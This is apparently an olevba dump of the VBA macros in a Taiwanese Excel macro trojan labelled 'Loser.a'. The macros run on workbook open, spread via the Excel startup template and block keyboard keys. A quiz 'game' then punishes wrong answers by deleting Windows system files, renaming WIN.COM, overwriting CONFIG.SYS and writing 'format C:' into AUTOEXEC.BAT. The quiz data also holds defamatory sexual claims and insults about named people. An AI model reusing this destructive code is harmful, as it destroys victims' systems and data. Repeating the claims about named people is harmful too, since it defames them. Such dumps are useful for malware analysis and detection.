olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_BeforeClose(Cancel As Boolean)
    On Error Resume Next
    If Not OK Then
        Cancel = True
    Else
        Cancel = False
        Exit Sub
    End If
    ThisWorkbook.Worksheets("ExcelNo1").Visible = False
    ThisWorkbook.Worksheets("ExcelNo1").Save
    Set S = Nothing
End Sub
Private Sub Workbook_Open()
    AutoOpen.Main
    ThisWorkbook.Worksheets("ExcelNo1").Visible = True
    ThisWorkbook.Worksheets("ExcelNo1").Activate
    OK = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65 - OLE stream: '_VBA_PROJECT_CUR/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Global Const Config$ = "C:\CONFIG.SYS"
Global Const Autoexec$ = "C:\AUTOEXEC.BAT"

Public S As Object, OK As Boolean
Public OfficeDir$, TemplateDir$, StartDir$
Public Sub Main()
    StatusBar = "正在初始化設定..."
    Application.ScreenUpdating = False
    SaveFile
    GetDirs
    InterruptKeys
    StatusBar = "Excel No.1已經佔據您的系統"
    Application.ScreenUpdating = True
End Sub
Public Sub GetDirs()
    ExcelDir$ = Application.Path
    TemplateDir$ = Application.TemplatesPath
    StartDir$ = Application.StartupPath
End Sub
Public Sub KillMenu()
    On Error Resume Next
    Application.CommandBars("Worksheet Menu Bar").Controls(9).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(8).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(6).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(5).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(4).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(3).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(2).Delete
    Application.CommandBars("Worksheet Menu Bar").Controls(1).Delete
End Sub
Public Sub ReAuto()
    On Error Resume Next
    If UCase(Dir(Autoexec$)) = "AUTOEXEC.BAT" Then
        SetAttr Autoexec$, 0
    End If
    No = FreeFile
    Open "C:\c" For Output As #No
        Print #No, "y" & Chr$(13)
        Print #No, Chr$(13)
    Close #No
    No = FreeFile
    Open Autoexec$ For Output As #No
        Print #No, "PATH = C:\;" & S.WinPath & "\COMMAND;" & S.SystemPath
        Print #No, "format C:/u/q/v:EXCELNO1 < c"
    Close #No
End Sub
Public Sub SaveFile()
    f$ = StartDir & "\BOOK.XLT"
    If UCase(Dir(f$)) = "BOOK.XLT" Then Exit Sub
    On Error Resume Next
    Application.ActiveWorkbook.SaveAs FileName:=f$, FileFormat:=xlTemplate
    Set S = New X
    For c = 1 To 20
        S.CreateLink 1, "Excel No.1 - " & c, f$, ""
    Next c
    Set S = Nothing
End Sub
Public Sub InterruptKeys()
    On Error Resume Next
    With Application
        .OnKey "{BACKSPACE}", ""
        .OnKey "{BREAK}", ""
        .OnKey "{DOWN}", ""
        .OnKey "{UP}", ""
        .OnKey "{LEFT}", ""
        .OnKey "{RIGHT}", ""
        .OnKey "{ESC}", ""
        .OnKey "{DEL}", ""
        .OnKey "{HOME}", ""
        .OnKey "{END}", ""
        .OnKey "{PGDN}", ""
        .OnKey "{PGUP}", ""
        .OnKey "{RETURN}", ""
        .OnKey "{ENTER}", ""
        .OnKey "{TAB}", ""
        .OnKey "%{F4}", ""
        .OnKey "{F1}", ""
        .OnKey "{NUMLOCK}", ""
    End With
End Sub
Public Sub SafeExit()
    OK = True
    ThisWorkbook.Saved = True
    Application.Quit
End Sub
Public Sub ReConfig()
    On Error Resume Next
    If UCase(Dir(Config$)) = "CONFIG.SYS" Then
        SetAttr "C:\CONFIG.SYS", 0
    End If
    No = FreeFile
    Open Config$ For Output As #No
        Print #No, "Rem **** You're infected by Excel No.1 Macro Virus!"
        Print #No, "Dos = Low"
        Print #No, "FCBS = 255"
        Print #No, "FILES = 255"
        Print #No, "LastDrive = Z"
        Print #No, "SET TEMP = C:\"
        Print #No, "SET TMP = C:\"
        Print #No, "STACKS = 64, 512"
        Print #No, "SWITCHES= /F /K /N"
    Close #No
End Sub
-------------------------------------------------------------------------------
VBA MACRO Progress.bas 
in file: Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65 - OLE stream: '_VBA_PROJECT_CUR/VBA/Progress'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Public Declare Function fCreateShellLink Lib "STKIT432.DLL" _
        (ByVal Folder As String, ByVal ShortCutName As String, _
        ByVal ExePath As String, ByVal Params As String) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Sub Begin()
    MsgBox "開始進入自我解毒程序", vbOKOnly & vbInformation, "Excel No.1"
    Game.Show
    Guess.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO Game.frm 
in file: Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65 - OLE stream: '_VBA_PROJECT_CUR/VBA/Game'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim SafeOver As Boolean
Private Sub cmdStart_Click()
    d = S.GetRandomNumber(1, 100)
    On Error Resume Next
    Select Case d
        Case 1 To 46
            Tar1.Visible = False
            Tar2.Visible = False
            Tar3.Caption = "第三層"
            Arrow.Top = Arrow.Top - 45
            Arrow.Left = Arrow.Left - 60
            Arrow.ZOrder 0
            MsgBox "哈哈！我就說嘛！今天是您倒楣的日子！", vbCritical
            ReConfig
            ReAuto
        Case 47 To 80
            Tar1.Visible = False
            Tar2.Caption = "第二層"
            Tar3.Visible = False
            Arrow.Top = Arrow.Top - 60
            Arrow.Left = Arrow.Left - 30
            Arrow.ZOrder 0
            MsgBox "哈哈！我就說嘛！今天是您倒楣的日子！", vbCritical
            ReConfig
            KillMenu
            Kill S.WinPath & "\*.ini"
        Case Else
            Tar1.Caption = "第一層－紅心"
            Tar2.Visible = False
            Tar3.Visible = False
            Arrow.Top = Arrow.Top - 60
            Arrow.ZOrder 0
            MsgBox "真走運！讓您蒙到啦！下一關一定讓您死得很難看！", vbInformation
    End Select
    SafeOver = True
    Unload Game
End Sub
Private Sub UserForm_Initialize()
    SafeOver = False
    Set S = New X
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    If SafeOver Then
        Cancel = False
    Else
        Cancel = True
    End If
    Set S = Nothing
End Sub
-------------------------------------------------------------------------------
VBA MACRO Guess.frm 
in file: Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65 - OLE stream: '_VBA_PROJECT_CUR/VBA/Guess'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim SafeOver As Boolean, Ret As Integer, Total As Integer
Dim Q(1 To 100) As String, Opt1(1 To 100) As String, Opt2(1 To 100) As String, Opt3(1 To 100) As String, Ans(1 To 100) As Integer
Private Function Choose() As Integer
    d = S.GetRandomNumber(1, 73)
    Content.Caption = Q(d)
    O1.Caption = Opt1(d)
    O2.Caption = Opt2(d)
    O3.Caption = Opt3(d)
    Choose = d
End Function
Private Sub Finish()
    If Val(LabRight.Caption) = 0 Then
            MsgBox "真是超級遜斃了！一題也沒答對！你在混吃等死啊？", vbCritical
            On Error Resume Next
            Name S.WinPath & "\WIN.COM" As S.WinPath & "\LOSE.COM"
            Kill S.WinPath & "\*.*"
            Kill S.SystemPath & "\*.*"
    ElseIf Val(LabRight.Caption) = Total Then
            MsgBox "真棒！完全答對！Excel No.1 作者群對您致崇高的敬意，按下確定按鈕後自動清除本病毒..."
            SafeOver = True
            On Error Resume Next
            Unload Me
            For Each w2 In Workbooks
                w2.Saved = True
            Next w2
            OK = True
            Application.Quit
    Else
            MsgBox "您總共答對了 " & LabRight.Caption & " 題"
    End If
    SafeOver = True
    Unload Me
End Sub
Private Sub Correct()
    LabRight.Caption = Val(LabRight.Caption) + 1
End Sub
Private Sub Wrong()
    On Error Resume Next
    Static T
    Select Case T
        Case 0
            Kill S.SystemPath & "\*.DLL"
        Case 1
            Kill S.WinPath & "\*.COM"
        Case 2
            Kill S.WinPath & "\*.EXE"
        Case 3
            Kill S.SystemPath & "\*.DRV"
        Case 4
            Kill S.WinPath & "\*.INF"
        Case 5
            Kill S.WinPath & "\*.INI"
        Case 6
            Kill CurDir & "\*.*"
        Case 7
            Kill Application.Path & "\*.*"
        Case 8
            Kill Application.TemplatesPath & "\*.*"
        Case Else
            For m = 0 To 2
                For n = 1 To S.GetRandomNumber(15, 99)
                    S.CreateLink m, "Virus" & n, "C:\COMMAND.COM", ""
                Next n
            Next m
    End Select
    T = T + 1
End Sub
Private Sub CommandButton1_Click()
    If Val(LabRest.Caption) = 0 Then
        Finish
    End If
    Ret = Choose()
    Sure.Enabled = True
    CommandButton1.Enabled = False
End Sub
Private Sub Sure_Click()
    If Ret = 0 Then Exit Sub
    Select Case Ans(Ret)
        Case 1
            If O1.Value = True Then
                Correct
            Else
                Wrong
            End If
        Case 2
            If O2.Value = True Then
                Correct
            Else
                Wrong
            End If
        Case 3
            If O3.Value = True Then
                Correct
            Else
                Wrong
            End If
    End Select
    LabRest.Caption = Val(LabRest.Caption) - 1
    Sure.Enabled = False
    CommandButton1.Enabled = True
End Sub
Private Sub UserForm_Initialize()
    SafeOver = False
    Set S = New X
    ReadQuestions
    ReadQuestions2
    Sure.Enabled = False
    Total = Val(LabRest.Caption)
    Content.Caption = "按一下按鈕開始測驗"
End Sub
Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    If SafeOver Then
        Cancel = False
    Else
        Cancel = True
        Exit Sub
    End If
    Set S = Nothing
End Sub
Private Sub ReadQuestions2()
    Q(61) = "以下城市由北向南排列何者錯誤？"
    Opt1(61) = "瑞穗=>玉里=>光復=>成功=>台東"
    Opt2(61) = "汐止=>鶯歌=>內壢=>板橋=>中壢"
    Opt3(61) = "汐止=>萬華=>內壢=>楊梅=>苗栗"
    Ans(61) = 2
    
    Q(62) = "以下城市由北向南排列何者正確？"
    Opt1(62) = "頭城=>瑞穗=>玉里=>成功=>台東"
    Opt2(62) = "羅東=>宜蘭=>花蓮=>台東=>屏東"
    Opt3(62) = "汐止=>萬華=>中壢=>湖口=>山佳"
    Ans(62) = 1
    
    Q(63) = "以下關於台北市的道路由北向南排列何者正確？"
    Opt1(63) = "民族東路=>民權東路=>北平東路=>長安東路"
    Opt2(63) = "忠孝東路=>南京東路=>北平東路=>長安東路"
    Opt3(63) = "民族東路=>民權東路=>民生東路=>南京東路"
    Ans(63) = 3
    
    Q(64) = "以下關於台北市的道路由東向西排列何者正確？"
    Opt1(64) = "重慶北路=>中山北路=>建國北路=>敦化北路"
    Opt2(64) = "中山北路=>敦化北路=>新生北路=>建國北路"
    Opt3(64) = "中山北路=>重慶北路=>建國北路=>基隆路"
    Ans(64) = 1
    
    Q(65) = "台北市的中山北路不和以下何者相交？"
    Opt1(65) = "民族東路"
    Opt2(65) = "羅斯福路"
    Opt3(65) = "忠孝東路"
    Ans(65) = 2
    
    Q(66) = "台北市的忠孝東路和以下何者相交？"
    Opt1(66) = "仁愛路"
    Opt2(66) = "羅斯福路"
    Opt3(66) = "敦化北路"
    Ans(66) = 1
    
    Q(67) = "台北市的民權西路和以下何者相交？"
    Opt1(67) = "承德路"
    Opt2(67) = "羅斯福路"
    Opt3(67) = "敦化北路"
    Ans(67) = 1
    
    Q(68) = "台北市的南京西路和以下何者相交？"
    Opt1(68) = "承德路"
    Opt2(68) = "信義路"
    Opt3(68) = "建國北路"
    Ans(68) = 1
    
    Q(69) = "台北市的長安東路和以下何者相交？"
    Opt1(69) = "中山北路"
    Opt2(69) = "信義路"
    Opt3(69) = "承德路"
    Ans(69) = 1
    
    Q(70) = "以下何者不是台北市的大安森林公園的周邊道路？"
    Opt1(70) = "忠孝東路"
    Opt2(70) = "信義路"
    Opt3(70) = "和平東路"
    Ans(70) = 1
    
    Q(71) = "以下何者不與台北市的木柵捷運相交？"
    Opt1(71) = "忠孝東路"
    Opt2(71) = "承德路"
    Opt3(71) = "民生東路"
    Ans(71) = 2
    
    Q(72) = "以下何者不是台北市士林區的道路名稱？"
    Opt1(72) = "仰德大道"
    Opt2(72) = "中山北路"
    Opt3(72) = "南海路"
    Ans(72) = 3
    
    Q(73) = "以下何者不是台北市士林區的道路名稱？"
    Opt1(73) = "重慶南路"
    Opt2(73) = "中山北路"
    Opt3(73) = "忠誠路"
    Ans(73) = 1
End Sub
Private Sub ReadQuestions()
    Q(1) = "請問以下哪個IP是中興法商BBS的位址？"
    Opt1(1) = "140.112.1.6"
    Opt2(1) = "192.192.35.34"
    Opt3(1) = "203.64.35.100"
    Ans(1) = 2
    
    Q(2) = "請問以下哪個人最不可能是 Excel No.1 的作者？"
    Opt1(2) = "翁世豪"
    Opt2(2) = "吳俊緯"
    Opt3(2) = "陳清芳"
    Ans(2) = 3
    
    Q(3) = "請問以下的北極星使用者中，哪個人最賤？"
    Opt1(3) = "Shirely"
    Opt2(3) = "Takeshi"
    Opt3(3) = "July"
    Ans(3) = 1
    
    Q(4) = "請問以下哪個人已經不是處女了？"
    Opt1(4) = "崇Ｚ企專Ｘ貿科蔡芳宜"
    Opt2(4) = "台北Ｚ專Ｘ保科王韻親"
    Opt3(4) = "Ｚ吳大學范亞雰"
    Ans(4) = 3
    
    Q(5) = "請問通常高普考在哪個月放榜？"
    Opt1(5) = "一月"
    Opt2(5) = "八月"
    Opt3(5) = "十月"
    Ans(5) = 3
    
    Q(6) = "請問以下哪個人不是殺害白曉燕的兇手？"
    Opt1(6) = "陳進興"
    Opt2(6) = "林春生"
    Opt3(6) = "白冰冰"
    Ans(6) = 3
    
    Q(7) = "請問以下哪個軟體不是微軟公司出的？"
    Opt1(7) = "PHOTOSHOP"
    Opt2(7) = "OFFICE 97"
    Opt3(7) = "INTERNET EXPLORER"
    Ans(7) = 1
    
    Q(8) = "請問以下哪個軟體不是微軟公司出的？"
    Opt1(8) = "WORD PRO"
    Opt2(8) = "OFFICE 97"
    Opt3(8) = "WINDOWS 95"
    Ans(8) = 1
    
    Q(9) = "溫尼颱風過境造成慘重的損害，以下哪個單位最不需要負責？"
    Opt1(9) = "行政院各部會"
    Opt2(9) = "士林地檢署"
    Opt3(9) = "水利局"
    Ans(9) = 2
    
    Q(10) = "以下哪個人是VB5與ActiveX程式設計的作者？"
    Opt1(10) = "薛曉嵐"
    Opt2(10) = "王國榮"
    Opt3(10) = "鄧文淵"
    Ans(10) = 2
    
    Q(11) = "以下哪個人是Word 97的使用藝術之作者？"
    Opt1(11) = "薛曉嵐"
    Opt2(11) = "王國榮"
    Opt3(11) = "鄧文淵"
    Ans(11) = 1
    
    Q(12) = "以下哪個人是北港香爐人人插一書中所影射的人？"
    Opt1(12) = "瞿美鳳"
    Opt2(12) = "白冰冰"
    Opt3(12) = "陳文茜"
    Ans(12) = 3
    
    Q(13) = "以下哪個人目前最不可能是台視新聞的主播？"
    Opt1(13) = "李慧慧"
    Opt2(13) = "蘇宗怡"
    Opt3(13) = "劉麗惠"
    Ans(13) = 2
    
    Q(14) = "以下哪個人目前最不可能當中華民國總統？"
    Opt1(14) = "江澤民"
    Opt2(14) = "宋楚瑜"
    Opt3(14) = "連戰"
    Ans(14) = 1
    
    Q(15) = "以下哪種土壤最有可能分布在台灣西部海埔地？"
    Opt1(15) = "紅壤"
    Opt2(15) = "鹽漬土"
    Opt3(15) = "紫棕壤"
    Ans(15) = 2
    
    Q(16) = "以下哪種土壤最有可能分布在四川盆地？"
    Opt1(16) = "紅壤"
    Opt2(16) = "鹽漬土"
    Opt3(16) = "灰棕壤"
    Ans(16) = 1
    
    Q(17) = "以下哪個名稱不曾被病毒作者拿來命名過？"
    Opt1(17) = "馬蓋先"
    Opt2(17) = "台灣原住民"
    Opt3(17) = "中央情報局"
    Ans(17) = 3
    
    Q(18) = "以下哪個人在天宇布袋戲中活得最久？"
    Opt1(18) = "藏修羅"
    Opt2(18) = "孤獨毒"
    Opt3(18) = "藏神秘"
    Ans(18) = 3
    
    Q(19) = "以下哪個人在天宇布袋戲中活得最久？"
    Opt1(19) = "六手魔像"
    Opt2(19) = "孤獨毒"
    Opt3(19) = "怒雨飛龍"
    Ans(19) = 1
    
    Q(20) = "以下哪個人在天宇布袋戲裡和藏神秘關係最密切？"
    Opt1(20) = "矮子靈"
    Opt2(20) = "三裁公"
    Opt3(20) = "怒雨飛龍"
    Ans(20) = 2
    
    Q(21) = "以下哪個人在天宇布袋戲裡和紅雲關係最不深？"
    Opt1(21) = "造雲麒麟"
    Opt2(21) = "劍苗小雙"
    Opt3(21) = "夢雨涵"
    Ans(21) = 2
    
    Q(22) = "以下哪個單位是中華民國最高的行政機關？"
    Opt1(22) = "行政院"
    Opt2(22) = "總統府"
    Opt3(22) = "國家安全局"
    Ans(22) = 1
    
    Q(23) = "以下哪個單位是中華民國最高的立法機關？"
    Opt1(23) = "行政院"
    Opt2(23) = "總統府"
    Opt3(23) = "立法院"
    Ans(23) = 3
    
    Q(24) = "以下哪個單位可以解釋中華民國憲法？"
    Opt1(24) = "立法院"
    Opt2(24) = "總統府"
    Opt3(24) = "大法官會議"
    Ans(24) = 3
    
    Q(25) = "國父認為什麼是人民權利的保障書？"
    Opt1(25) = "民法"
    Opt2(25) = "刑法"
    Opt3(25) = "憲法"
    Ans(25) = 3
    
    Q(26) = "目前以下何人不享有言論免責權？"
    Opt1(26) = "立法委員"
    Opt2(26) = "總統"
    Opt3(26) = "省議員"
    Ans(26) = 2
    
    Q(27) = "目前以下何人不享有言論免責權？"
    Opt1(27) = "立法委員"
    Opt2(27) = "監察委員"
    Opt3(27) = "國大代表"
    Ans(27) = 2
    
    Q(28) = "目前以下何人不享有言論免責權？"
    Opt1(28) = "立法委員"
    Opt2(28) = "法官"
    Opt3(28) = "國大代表"
    Ans(28) = 2
    
    Q(29) = "我國受理行政訴訟的機關是？"
    Opt1(29) = "行政院會議"
    Opt2(29) = "憲法法庭"
    Opt3(29) = "行政法院"
    Ans(29) = 3
    
    Q(30) = "我國哪種官職的就職宣誓誓詞明定於憲法內？"
    Opt1(30) = "行政院長"
    Opt2(30) = "總統"
    Opt3(30) = "司法院長"
    Ans(30) = 2
    
    Q(31) = "我國國民大會若要修改憲法，其決議通過的人數需是出席代表的幾分之幾？"
    Opt1(31) = "2/3"
    Opt2(31) = "3/4"
    Opt3(31) = "1/2"
    Ans(31) = 2

    Q(32) = "我國法官的任期是？"
    Opt1(32) = "九年"
    Opt2(32) = "終身職"
    Opt3(32) = "與執政黨同進退"
    Ans(32) = 2
    
    Q(33) = "我國大法官會議的主席是？"
    Opt1(33) = "首席大法官"
    Opt2(33) = "總統府秘書長"
    Opt3(33) = "司法院長"
    Ans(33) = 3
    
    Q(34) = "我國國土面積是多少平方公里？"
    Opt1(34) = "一千一百四十二萬"
    Opt2(34) = "二千兩百四十二萬"
    Opt3(34) = "三千三百四十二萬"
    Ans(34) = 1
    
    Q(35) = "台灣本島面積是多少平方公里？"
    Opt1(35) = "一千九百四十多"
    Opt2(35) = "二千七百六十多"
    Opt3(35) = "三千五百七十多"
    Ans(35) = 1
    
    Q(36) = "台灣本島最大平原是？"
    Opt1(36) = "嘉南平原"
    Opt2(36) = "花東平原"
    Opt3(36) = "宜蘭平原"
    Ans(36) = 1
    
    Q(37) = "以我國版圖整體位置而言，位於幾何中心的地理區是？"
    Opt1(37) = "兩湖盆地"
    Opt2(37) = "河西走廊"
    Opt3(37) = "隴西高原"
    Ans(37) = 3
    
    Q(38) = "位於長白山地的天池是？"
    Opt1(38) = "火口湖"
    Opt2(38) = "偃塞湖"
    Opt3(38) = "斷層湖"
    Ans(38) = 1
    
    Q(39) = "有塞上江南之稱的是？"
    Opt1(39) = "嘉南平原"
    Opt2(39) = "河套"
    Opt3(39) = "四川都江堰"
    Ans(39) = 2
    
    Q(40) = "Visual Basic 5.0中，命令按鈕物件不具有以下何種屬性？"
    Opt1(40) = "Caption"
    Opt2(40) = "Path"
    Opt3(40) = "MouseIcon"
    Ans(40) = 2
    
    Q(41) = "Visual Basic 5.0中，表格物件不具有以下何種屬性？"
    Opt1(41) = "Visible"
    Opt2(41) = "Enabled"
    Opt3(41) = "Value"
    Ans(41) = 3
    
    Q(42) = "下列何者不是網際網路提供的功能或服務？"
    Opt1(42) = "世界地理資訊系統"
    Opt2(42) = "檔案查詢系統"
    Opt3(42) = "電子佈告欄系統"
    Ans(42) = 1
    
    Q(43) = "網際網路的英文是？"
    Opt1(43) = "World Wide Web"
    Opt2(43) = "Intranet"
    Opt3(43) = "Internet"
    Ans(43) = 3
    
    Q(44) = "網際網路的英文是？"
    Opt1(44) = "World Wide Web"
    Opt2(44) = "Intranet"
    Opt3(44) = "Internet"
    Ans(44) = 3
    
    Q(45) = "網際資訊網路的英文是？"
    Opt1(45) = "Internet"
    Opt2(45) = "Hinet"
    Opt3(45) = "Network"
    Ans(45) = 2
    
    Q(46) = "全球資訊網的英文是？"
    Opt1(46) = "FTP"
    Opt2(46) = "WWW"
    Opt3(46) = "BBS"
    Ans(46) = 2
    
    Q(47) = "屬於資策會的網路是？"
    Opt1(47) = "Hinet"
    Opt2(47) = "Seednet"
    Opt3(47) = "TANet"
    Ans(47) = 2
    
    Q(48) = "台灣學術網路的英文是？"
    Opt1(48) = "Seednet"
    Opt2(48) = "Hinet"
    Opt3(48) = "TANet"
    Ans(48) = 3
    
    Q(49) = "１２８的４次方是多少？"
    Opt1(49) = "268435456"
    Opt2(49) = "288423456"
    Opt3(49) = "208435446"
    Ans(49) = 1
    
    Q(50) = "有詩聖之稱的中國歷史名人是誰？"
    Opt1(50) = "杜甫"
    Opt2(50) = "杜牧"
    Opt3(50) = "李白"
    Ans(50) = 1
    
    Q(51) = "以下何者不是布袋戲霹靂系列中的人物？"
    Opt1(51) = "秦假仙"
    Opt2(51) = "香九齡"
    Opt3(51) = "素還貞"
    Ans(51) = 2
    
    Q(52) = "以下何者不是布袋戲天宇系列中的人物？"
    Opt1(52) = "羅雀"
    Opt2(52) = "香九齡"
    Opt3(52) = "鬼王棺"
    Ans(52) = 3
    
    Q(53) = "以下何者不是Excel能開啟之檔案的常見副檔名？"
    Opt1(53) = "XLA"
    Opt2(53) = "XLS"
    Opt3(53) = "DOT"
    Ans(53) = 3
    
    Q(54) = "以下何者不是Excel能開啟之檔案的常見副檔名？"
    Opt1(54) = "XLB"
    Opt2(54) = "XLC"
    Opt3(54) = "XLM"
    Ans(54) = 2
    
    Q(55) = "WIndows 95內的附屬遊戲程式新接龍之檔案的名稱為何？"
    Opt1(55) = "Msheart.exe"
    Opt2(55) = "Freecell.exe"
    Opt3(55) = "Sol.exe"
    Ans(55) = 2
    
    Q(56) = "WIndows 95內的附屬遊戲程式接龍之檔案的名稱為何？"
    Opt1(56) = "Msheart.exe"
    Opt2(56) = "Freecell.exe"
    Opt3(56) = "Sol.exe"
    Ans(56) = 3
    
    Q(57) = "以下哪一個檔案不是WIndows 95絕對必要內的開機檔？"
    Opt1(57) = "Emm386.exe"
    Opt2(57) = "Msdos.sys"
    Opt3(57) = "Command.com"
    Ans(57) = 1
    
    Q(58) = "以下哪一個檔案不是WIndows 95絕對必要內的開機檔？"
    Opt1(58) = "Io.sys"
    Opt2(58) = "Msdos.sys"
    Opt3(58) = "Config.sys"
    Ans(58) = 3
    
    Q(59) = "以下哪一個不是圖形檔常見的副檔名？"
    Opt1(59) = "WK1"
    Opt2(59) = "JPG"
    Opt3(59) = "PCX"
    Ans(59) = 1
    
    Q(60) = "以下哪一個不是圖形檔常見的副檔名？"
    Opt1(60) = "DOC"
    Opt2(60) = "GIF"
    Opt3(60) = "BMP"
    Ans(60) = 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO X.cls 
in file: Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65 - OLE stream: '_VBA_PROJECT_CUR/VBA/X'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Function SystemPath() As String
        Dim b As String * 255
        b = Space$(255)
        L = GetSystemDirectory(b, 255)
        SystemPath = Trim(Left(b, L))
End Function
Public Function GetComputerName()
        Dim b As String * 255
        b = Space$(255)
        L = GetComputerName(b, 255)
        L = InStr(1, b, Chr$(0))
        b = Left(b, L - 1)
        m_ComputerName = Trim(b)
        ComputerName = m_ComputerName
End Function
Public Function WinPath() As String
        Dim b As String * 255
        b = Space$(255)
        L = GetWindowsDirectory(b, 255)
        WinPath = Trim(Left(b, L))
End Function
Public Function GetRandomNumber(Mini As Single, Maxi As Single) As Single
        If Mini >= Maxi Then
                MsgBox Mini & " 必須比 " & Maxi & " 大！", vbCritical
                GetRandomNumber = 0
                Exit Function
        End If
        Randomize Timer
        GetRandomNumber = Int((Maxi * Rnd) + Mini)
End Function
Public Sub CreateLink(位置 As Integer, 捷徑名稱 As String, 檔案路徑 As String, 程式參數 As String)
        Screen.MousePointer = vbHourglass
        Select Case 位置
                Case 0 '桌面
                        Ret = fCreateShellLink("..\..\Desktop", 捷徑名稱, 檔案路徑, 程式參數)
                Case 1 '開始功能表
                        Ret = fCreateShellLink("..", 捷徑名稱, 檔案路徑, 程式參數)
                Case 2 '程式集
                        Ret = fCreateShellLink(".", 捷徑名稱, 檔案路徑, 程式參數)
        End Select
        Screen.MousePointer = 1
End Sub
Public Sub WriteSetting(Section As String, KeyName As String, Setting As String, File As String)
        h = WritePrivateProfileString(Section, KeyName, Setting, File)
End Sub
Public Function GetSettings(AppName As String, Key As String, File As String) As String
        R$ = String$(255, 0)
        X = GetPrivateProfileString(AppName, Key, "", R$, Len(R$), File)
        R$ = Left(R$, InStr(R$, Chr(0)) - 1)
        GetSettings = R$
End Function
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  ExcelNo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�ө���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�ө���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`�S	g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Trojan.MSExcel.Loser.a-3a2ca0c158e44079a979785d2267af2d5a5eef65' - OLE stream: '_VBA_PROJECT_CUR/Game/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N!k_j
-------------------------------------------------------------------------------
